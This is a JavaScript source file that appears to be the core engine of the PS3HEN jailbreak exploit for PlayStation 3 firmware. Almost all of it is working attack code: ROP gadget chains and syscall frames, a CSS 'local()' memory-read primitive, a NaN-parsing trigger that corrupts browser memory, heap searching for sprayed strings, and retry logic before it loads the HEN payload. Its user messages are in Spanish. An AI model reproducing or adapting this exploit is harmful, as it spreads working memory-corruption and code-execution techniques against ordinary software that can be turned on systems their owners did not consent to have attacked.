/**
 * PS3HEN ROP Core Engine
 * Unified logic for all firmware versions with Auto-Retry support.
 * This file expects specific global variables and functions to be defined by the version file.
 */

// String & Number Prototype Extensions
String.prototype.toHex16 = function() { return ("0000" + this).substr(-4); };
String.prototype.toAscii = function(hex_16) {
    var ascii = '';
    for (var i = 0; i < this.length; i++) {
        ascii += (hex_16 === true) ? this.charCodeAt(i).toString(16).toHex16() : this.charCodeAt(i).toString(16);
    }
    return ascii;
};
String.prototype.convert = function(ascii) {
    if (this.length < 1) return '';
    var asciistr = (ascii === true) ? this : this.toAscii();
    while ((asciistr.length % 4) !== 0) asciistr += '00';
    if (asciistr.substr(asciistr.length - 3, 2) !== '00') asciistr += '0000';
    var ret = [];
    for (var i = 0; i < asciistr.length; i += 4) {
        ret.push(String.fromCharCode(parseInt(asciistr.substr(i, 4), 16)));
    }
    return ret.join('');
};
String.prototype.convertedSize = function(ascii) {
    if (this.length < 1) return 0;
    var asciistr = (ascii === true) ? this : this.toAscii();
    while ((asciistr.length % 4) !== 0) asciistr += '00';
    if (asciistr.substr(asciistr.length - 3, 2) !== '00') asciistr += '0000';
    return asciistr.length / 2;
};
String.prototype.replaceAt = function(index, ch) {
    return this.substr(0, index) + ch + this.substr(index + ch.length);
};
String.prototype.repeat = function(num) {
    return new Array(num + 1).join(this);
};
Number.prototype.noExponents = function() {
    var data = String(this).split(/[eE]/);
    if (data.length === 1) return data[0];
    var z = '', sign = this < 0 ? '-' : '',
        str = data[0].replace('.', ''),
        mag = Number(data[1]) + 1;
    if (mag < 0) {
        z = sign + '0.';
        while (mag++) z += '0';
        return z + str.replace(/^\-/, '');
    }
    mag -= str.length;
    while (mag--) z += '0';
    return str + z;
};

// Common ROP Helpers
function hexh2bin(hex_val) { return String.fromCharCode(hex_val); }
function hexw2bin(hex_val) { return String.fromCharCode(hex_val >> 16) + String.fromCharCode(hex_val); }
function hexdw2bin(hex_val) { return hexw2bin(0) + hexw2bin(hex_val); }

function store_word(store_offset, val) {
    return hexdw2bin(gadget_mod3_addr) + fill_by_16bytes(0x60, dbyte41) + hexdw2bin(val) + fill_by_8bytes(0x8, dbyte41) + hexdw2bin(store_offset - 0xC74) + fill_by_16bytes(0x10, dbyte41)
        + hexdw2bin(gadget_mod7_addr) + fill_by_16bytes(0x70, dbyte41) + hexdw2bin(gtemp_addr) + hexdw2bin(gtemp_addr) + hexdw2bin(gtemp_addr) + hexdw2bin(sp_exit) + fill_by_8bytes(0x8, dbyte41);
}

function stack_frame_swap(new_stack_addr) {
    return hexdw2bin(gadget_mod2_addr) + fill_by_16bytes(0x60, dbyte41) + hexdw2bin(gtemp_addr) + hexdw2bin(new_stack_addr) + fill_by_8bytes(0x8, dbyte41) + hexdw2bin(gadget_mod9_addr);
}

function syscall(sc, r3, r4, r5, r6, r7, r8, r9, r10) {
    return hexdw2bin(gadget_mod2_addr) + fill_by_16bytes(0x60, dbyte41) + hexdw2bin(gtemp_addr) + fill_by_16bytes(0x10, dbyte41) + hexdw2bin(gadget_mod1_addr) + fill_by_16bytes(0x50, dbyte41) + fill_by_4bytes(0xC, dbyte41) + hexw2bin(sc) + hexw2bin(r10)
        + hexw2bin(r8) + hexw2bin(r7) + hexw2bin(r6) + hexw2bin(r5) + hexw2bin(r4) + fill_by_4bytes(0x4, dbyte41) + hexw2bin(r9) + fill_by_16bytes(0x20, dbyte41) + hexdw2bin(r3) + fill_by_16bytes(0x10, dbyte41) + hexdw2bin(gadget_mod2_addr)
        + fill_by_16bytes(0x60, dbyte41) + hexdw2bin(gtemp_addr) + fill_by_16bytes(0x10, dbyte41) + hexdw2bin(gadget_mod4a_addr) + fill_by_16bytes(0x60, dbyte41) + hexdw2bin(gtemp_addr) + hexdw2bin(sp_exit) + fill_by_8bytes(0x8, dbyte41);
}

function syscall_r3_p2p(sc, r3_ptr, r4, r5, r6, r7, r8, r9, r10) {
    return hexdw2bin(gadget_mod2_addr) + fill_by_16bytes(0x60, dbyte41) + hexdw2bin(gtemp_addr) + fill_by_16bytes(0x10, dbyte41) + hexdw2bin(gadget_mod1_addr) + fill_by_16bytes(0x50, dbyte41) + fill_by_4bytes(0xC, dbyte41)
        + hexw2bin(sc) + hexw2bin(r10) + hexw2bin(r8) + hexw2bin(r7) + hexw2bin(r6) + hexw2bin(r5) + hexw2bin(r4) + fill_by_4bytes(0x4, dbyte41) + hexw2bin(r9) + fill_by_16bytes(0x20, dbyte41) + hexdw2bin(r3_ptr)
        + fill_by_16bytes(0x10, dbyte41) + hexdw2bin(gadget_mod4b_addr) + fill_by_16bytes(0x60, dbyte41) + hexdw2bin(gtemp_addr) + hexdw2bin(sp_exit) + fill_by_8bytes(0x8, dbyte41);
}

function syscall_r3r5_p2p(sc, r3_ptr, r4, r5_ptr, r6, r7, r8, r9, r10) {
    return hexdw2bin(gadget_mod2_addr) + fill_by_16bytes(0x60, dbyte41) + hexdw2bin(gtemp_addr) + fill_by_16bytes(0x10, dbyte41) + hexdw2bin(gadget_mod1_addr) + fill_by_16bytes(0x50, dbyte41) + fill_by_4bytes(0xC, dbyte41)
        + hexw2bin(sc) + hexw2bin(r10) + hexw2bin(r8) + hexw2bin(r7) + hexw2bin(r6) + fill_by_4bytes(0x4, dbyte41) + hexw2bin(r4) + fill_by_4bytes(0x4, dbyte41) + hexw2bin(r9) + fill_by_16bytes(0x10, dbyte41) + hexdw2bin(r5_ptr - 0x4) + hexdw2bin(gtemp_addr) + fill_by_8bytes(0x18, dbyte41)
        + hexdw2bin(gadget_mod4c_addr) + fill_by_16bytes(0xB0, dbyte41) + hexdw2bin(r3_ptr) + fill_by_16bytes(0x10, dbyte41)
        + hexdw2bin(gadget_mod4b_addr) + fill_by_16bytes(0x60, dbyte41) + hexdw2bin(gtemp_addr) + hexdw2bin(sp_exit) + fill_by_8bytes(0x8, dbyte41);
}

function fill_by_4bytes(nbytes, hex_val) {
    var stemp = ''; var iterator = 0; var tmp = hexh2bin(hex_val);
    while (iterator < nbytes / 4) { stemp += tmp.repeat(2); iterator++; }
    return stemp;
}
function fill_by_8bytes(nbytes, hex_val) {
    var stemp = ''; var iterator = 0; var tmp = hexh2bin(hex_val);
    while (iterator < nbytes / 8) { stemp += tmp.repeat(4); iterator++; }
    return stemp;
}
function fill_by_16bytes(nbytes, hex_val) {
    var stemp = ''; var iterator = 0; var tmp = hexh2bin(hex_val);
    while (iterator < nbytes / 16) { stemp += tmp.repeat(8); iterator++; }
    return stemp;
}

function fromIEEE754(bytes, ebits, fbits) {
    var retNumber = 0;
    var bits = [];
    var i, j, byte;
    for (i = bytes.length; i; i -= 1) {
        byte = bytes[i - 1];
        for (j = 8; j; j -= 1) { bits.push(byte % 2 ? 1 : 0); byte = byte >> 1; }
    }
    bits.reverse();
    var str = bits.join('');
    var bias = (1 << (ebits - 1)) - 1;
    var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
    var e = parseInt(str.substring(1, 1 + ebits), 2);
    var f = parseInt(str.substring(1 + ebits), 2);
    if (e === (1 << ebits) - 1) { retNumber = f !== 0 ? NaN : s * Infinity; }
    else if (e > 0) { retNumber = s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits)); }
    else if (f !== 0) { retNumber = s * Math.pow(2, -(bias - 1)) * (f / Math.pow(2, fbits)); }
    else { retNumber = s * 0; }
    return retNumber.noExponents();
}
function generateIEEE754(address, size) {
    var hex = new Array((address >> 24) & 0xFF, (address >> 16) & 0xFF, (address >> 8) & 0xFF, (address) & 0xFF, (size >> 24) & 0xFF, (size >> 16) & 0xFF, (size >> 8) & 0xFF, (size) & 0xFF);
    return fromIEEE754(hex, 11, 52);
}
function generateExploit(address, size) {
    var n = (address << 32) | ((size >> 1) - 1);
    return generateIEEE754(address, (n - address));
}
function readMemory(address, size) {
    if (document.getElementById('exploit')) { document.getElementById('exploit').style.src = "local(" + generateExploit(address, size) + ")"; }
}
function checkMemory(address, size, len) {
    if (document.getElementById('exploit')) {
        readMemory(address, size);
        return document.getElementById('exploit').style.src.substr(6, len);
    }
}
function trigger(exploit_addr) {
    if (document.getElementById('trigger')) { document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")"); }
    if (document.getElementById('trigger').innerHTML.indexOf("NaN") != -1) { HFWmsg(); }
}

function findJsVariableOffset(name, exploit_data, base, size, end) {
    var block = 0;
    while ((base + block * size) < end) {
        readMemory(base + block * size, size);
        var offset = document.getElementById('exploit').style.src.substr(6, size).indexOf(exploit_data);
        if (offset > 0) { return base + block * size + (offset * 2) + 4; }
        block++;
    }
    return 0;
}

function stack_frame_hookup() {
    return unescape("\u4141\u2A2F") + hexw2bin(gadget1_addr) + hexw2bin(toc_addr) + fill_by_16bytes(0x20, dbyte41) + hexdw2bin(toc_addr) + fill_by_16bytes(0x70, dbyte41);
}
function stack_frame_exit() { return hexdw2bin(gadget_mod8_addr) + unescape("\u2F2A"); }

function showMsg(str) { document.getElementById('result').innerHTML = str; }

// Auto-Retry Logic
function handleFailure() {
    var retries = parseInt(sessionStorage.getItem('hen_retries') || '0');
    if (retries < 3) {
        sessionStorage.setItem('hen_retries', retries + 1);
        showMsg("<h2><span style='color:orange'>Memoria fragmentada. Reintentando automáticamente (" + (retries + 1) + "/3)...</span></h2>");
        setTimeout(function() { window.location.reload(); }, 3000);
    } else {
        sessionStorage.setItem('hen_retries', '0');
        showMsg(fail_msg_frag);
    }
}

function load_check() {
    if (total_loops < max_loops) {
        showMsg(progress_msg_frag1 + ((100 / max_loops) * total_loops).toString() + progress_msg_frag2);
        t_out = setTimeout(initROP, 100, false);
    } else {
        total_loops = 0;
        handleFailure();
        t_out = 0;
    }
}

function initROP(init) {
    try {
        if (init === true) { frame_fails = 0; search_base_off = 0; search_size_ext = 0; }
        if (t_out !== 0) { clearTimeout(t_out); t_out = 0; }
        offset_array = [];
        xtra_data_addr = 0;
        stack_frame_addr = 0;
        jump_2_addr = 0;
        jump_1_addr = 0;
        var base_file_addr = 0, index_key_addr = 0, search_max_threshold = 70 * 0x100000, search_base = 0x80100000, search_size = 2 * mbytes;
        search_size_ext = 0 * mbytes;
        search_base_off = 0 * mbytes;
        total_loops++;

        // Construct xtra_data using global blueprint or variables
        xtra_data = buildXtraData();

        while (xtra_data_addr === 0) {
            if (search_max_threshold < search_size) { load_check(); return; }
            xtra_data = xtra_data.replaceAt(0, hexh2bin(0x7EFD));
            xtra_data_addr = findJsVariableOffset("xtra_data", xtra_data, search_base, search_size, search_base + search_max_threshold);
            search_max_threshold -= search_size;
        }

        // Initialize addresses based on offsets (provided by version file)
        initAddresses(xtra_data_addr);

        // Construct stack_frame using global blueprint
        stack_frame = buildStackFrame();

        while (stack_frame_addr === 0) {
            if (search_max_threshold < search_size + search_size_ext) { frame_fails++; if ((frame_fails % 10) === 0) { search_base_off += 0; search_size_ext += 0; } load_check(); return; }
            stack_frame = stack_frame.replaceAt(0, hexh2bin(0x2A2F));
            stack_frame_addr = findJsVariableOffset("stack_frame", stack_frame, search_base + search_base_off, search_size + search_size_ext, search_base + search_max_threshold);
            if (stack_frame_addr == -1) if (search_max_threshold < search_size + search_size_ext) { frame_fails++; load_check(); return; }
            search_max_threshold -= search_size + search_size_ext;
        }

        jump_2 = unescape("\u0102\u7EFB") + fill_by_16bytes(0x30, 0x8282) + hexw2bin(stack_frame_addr) + unescape("\uFB7E");
        while (jump_2_addr === 0) {
            if (search_max_threshold < search_size) { load_check(); return; }
            jump_2 = jump_2.replaceAt(0, hexh2bin(0x7EFB));
            jump_2_addr = findJsVariableOffset("jump_2", jump_2, search_base, search_size, search_base + search_max_threshold);
            if (jump_2_addr == -1) if (search_max_threshold < search_size) { load_check(); return; }
            search_max_threshold -= search_size;
        }

        jump_1 = unescape("\u4141\u7EFA") + hexw2bin(jump_2_addr) + unescape("\uFA7E");
        while (jump_1_addr === 0) {
            if (search_max_threshold < search_size) { load_check(); return; }
            jump_1 = jump_1.replaceAt(0, hexh2bin(0x7EFA));
            jump_1_addr = findJsVariableOffset("jump_1", jump_1, search_base, search_size, search_base + search_max_threshold);
            if (jump_1_addr == -1) if (search_max_threshold < search_size) { load_check(); return; }
            search_max_threshold -= search_size;
        }

        var sf = checkMemory(stack_frame_addr - 0x4, 0x10000, stack_frame.length);
        var x = checkMemory(xtra_data_addr - 0x4, 0x2000, xtra_data.length);
        var j2 = checkMemory(jump_2_addr - 0x4, 0x2000, jump_2.length);
        var j1 = checkMemory(jump_1_addr - 0x4, 0x2000, jump_1.length);

        if ((j2 === jump_2) && (j1 === jump_1) && (x === xtra_data) && (sf === stack_frame)) {
            if (t_out !== 0) { clearTimeout(t_out); }
            sessionStorage.setItem('hen_retries', '0'); // Success!
            showMsg('<h2>Descargando HEN...</h2>');
            window.location.href = 'HEN.P3T';
            setTimeout(listener, 1500);
        }
        else {
            load_check();
        }
    }
    catch (e) { }
}

function listener() {
    // Version specific listener can be overridden, otherwise default to simple timeout
    if (typeof versionListener === 'function') {
        versionListener();
    } else {
        showMsg('<h2>Instalando HEN, por favor espere...</h2>');
        triggerX();
    }
}

function triggerX() {
    setTimeout(trigger, 50, jump_1_addr);
    setTimeout(function() {
        handleFailure();
    }, 2000);
    t_out = 0;
    total_loops = 0;
}

function HFWmsg() {
    showMsg("<h2><span style='color:red'>Debes instalar el Firmware Hibrido (HFW) " + firmware_version + " antes de instalar el HEN!</h2></span>");
    throw new Error('');
}

function startExploit() {
    document.getElementById("run-btn").style.display = "none";
    showMsg("<h2>Preparando memoria...</h2>");
    
    // Performance Tweak: Give browser time to stabilize and run GC
    setTimeout(function() {
        if (fwv == firmware_version) {
            initROP(true);
        } else {
            HFWmsg();
        }
    }, 800);
}
